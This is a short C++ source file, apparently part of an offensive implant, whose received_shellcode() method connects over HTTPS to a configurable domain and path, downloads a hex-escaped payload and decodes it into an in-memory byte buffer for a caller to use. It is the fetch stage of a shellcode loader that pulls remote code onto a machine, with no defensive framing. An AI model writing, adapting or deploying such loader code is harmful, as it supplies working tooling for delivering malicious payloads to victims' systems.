#include "webcc.h"
#include "util.h"
#include "httpClient.h"
#include <vector>
#include <memory>
#include <iostream>

webcc::webcc(std::string domain, std::string path):domain(domain),path(path)
{

}

std::pair<unsigned char*, int>
webcc::received_shellcode(void)
{
    boost::asio::ssl::context ctx(boost::asio::ssl::context::sslv23);
    ctx.set_default_verify_paths();

    boost::asio::io_service io_service;
    httpClient c(io_service, ctx, domain, path);
    io_service.run();

    std::string body = c.get_body();
    int len = body.length() / 4;

    std::cout << "Receive payload: " << len << " bytes" << std::endl;
    std::vector<std::string> v;
    split_str(body, v, "\\x");

    unsigned char *shellcode = (unsigned char*)malloc(len);
    for (int i = 0; i < len; i++) {
        long int li2 = strtol(v[i].c_str(), NULL, 16);
        shellcode[i] = li2 & 0xFF;
    }

    return std::pair<unsigned char*, int>(shellcode, len);
}

